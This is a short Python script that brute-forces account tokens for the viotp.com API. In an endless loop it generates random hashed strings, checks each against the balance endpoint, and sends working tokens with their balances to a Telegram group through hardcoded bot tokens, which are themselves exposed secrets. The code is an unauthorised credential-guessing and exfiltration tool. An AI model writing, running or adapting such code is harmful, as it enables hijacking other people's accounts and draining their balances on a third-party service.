
import random, time
import string, requests
import hashlib
import telebot
from keep_alive import keep_alive
# Replace with your bot token and group chat ID
bot_token = "7012747019:AAG2VJJGa3akgBZ5OnUagMoadaGZI_rbSgE"
chat_id = "-4265239922"
bot_token2 = "6294707012:AAEaLDAQRo_GSiNhi63zPLrWnI5kaNTnc6M"
chat_id2 = "-4208892116"
# Create a Telegram bot instance
bot = telebot.TeleBot(bot_token)
bot2 = telebot.TeleBot(bot_token2)

def generate_random_alphanumeric_string(length=32):
	characters = string.ascii_lowercase + string.digits
	random_string = ''.join(random.sample(characters, length))
	return random_string


def generate_random_string(input_string):
	random_string = hashlib.sha256(input_string.encode()).hexdigest()
	random_string = random_string[:32]
	return random_string


def check_balance(random_string):
	"""Checks the balance using the provided random string."""
	url = f"https://api.viotp.com/users/balance?token={random_string}"
	response = requests.get(url).json()
	try:
		if response["status_code"]==200:
		        print(f"\033[92mSuccess! Random string: {random_string}\033[0m")
		        print(f"Balance: {response['data']['balance']}")
		        message = f"{random_string}_____{response['data']['balance']}"
		        bot.send_message(chat_id, message)
	        else:
		        print(f"\033[91mFail! Random string: {random_string}\033[0m")
		        message2 = f"{random_string}"
		        bot2.send_message(chat_id2, message2)
	except:pass



def run():
	random_string = generate_random_alphanumeric_string()
	random_string1 = generate_random_string(random_string)
	check_balance(random_string1)

keep_alive()
while True:
	run()
	time.sleep(3)
